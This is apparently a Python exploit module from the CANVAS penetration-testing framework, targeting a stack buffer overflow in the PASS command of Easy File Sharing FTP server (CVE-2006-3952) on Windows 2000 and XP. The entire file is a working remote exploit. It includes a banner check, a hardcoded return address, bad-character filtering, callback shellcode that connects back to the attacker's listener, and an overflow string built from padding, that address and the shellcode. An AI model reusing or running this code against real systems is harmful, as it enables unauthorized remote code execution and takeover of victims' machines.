#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

# System imports
import sys
import time
import os
import getopt
import socket

# CANVAS path appends
if "." not in sys.path: sys.path.append(".")

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine

# Documentation
NAME="easyfilesharing"
DESCRIPTION="Easy File Sharing Stack Overflow on PASS command"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="EFS Software"
DOCUMENTATION["Repeatability"]="One shot"
DOCUMENTATION["CVE Name"] = "CVE-2006-3952"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3952"
DOCUMENTATION['CVSS'] = 7.5
#DOCUMENTATION["URL"]="http://secunia.com/advisories/21097"
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP" ]

NOTES="""

"""

CHANGELOG="""

"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=21
        self.host=""
        self.shellcode=""
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        self.badstring="\x00/\\\r\n@ "
        self.setVersions()
        self.version=1
        self.searchbadstring = self.badstring
        self.name=NAME
        self.USEMSGPEEK=0
        self.username = "anonymous"
        self.password = "anonymous"
        return

    def setVersions(self):
        self.versions={}
        #name, jmp esi, shellcode
        self.versions[0] = ( "Autoversion (N/A)", 0x0 ) 
        self.versions[1] = ( "Easy File Sharing  v2.0 on Windows 2000 SP4", 0x75052FBC) # 75052FBC  Found jmp edi at 0x75052fbc [WSOCK32]


    def neededListenerTypes(self):
        if self.USEMSGPEEK:
            return []
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        if self.callback:
            host=self.callback.ip
            port=self.callback.port
        #rawshellcode = self.createInjectToSelf( host, port ) 
        #rawshellcode = self.createHeapSafeInjectIntoProcess( self.badstring, host, port )
        self.createWin32Shellcode( self.badstring, host, port)
        #self.createWin32SearchShellcode( host, port )
        return self.shellcode
    
    def test(self):
        """
        
        """
        return self.bannerchecktest({"Easy File Sharing FTP": 1})
    
    def run(self):
        self.host     = self.target.interface
        self.port     = int(self.argsDict.get("port", self.port))
        self.username = self.argsDict.get("username", self.username)
        self.password = self.argsDict.get("password", self.password)

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning enabled.")
            self.test()
            if self.version==0:
                self.log("Could not find version!")
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        try:
            #we're a bit over generous with this try:accept
            
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        

            data = s.recv( 1000 )
            self.log( "Recieved banner: %s" % prettyprint(data) )
            s.set_timeout(20)
            s.sendall( "USER %s\r\n" % self.username )
            data = s.recv( 1000 )
            self.log("USER command sent (%s)" % data)
            
            s.sendall( self.makesploit() )

            data=s.recv(1000)
            self.log( "Recieved %s" % prettyprint(data) )
            s.close()

            
        except:
            self.log("Attack reported no open socket - service died?")
            #self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            #return 0

        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return ret
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        
    def makesploit(self):
        """
        Construct the attack
        """
        ver = self.versions[self.version] 
        
        #self.log("Size of shellcode: 0x%x" % len(self.encodedsearchcode) )

        if  self.version == 1:
            stack = intel_order( ver[ 1 ] ) + "A" * 0x40 + self.shellcode

        #elif self.version == 2:

        sploitstring = "PASS ," + "A" * (2571 - 0x8) + stack+  "\r\n"

        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

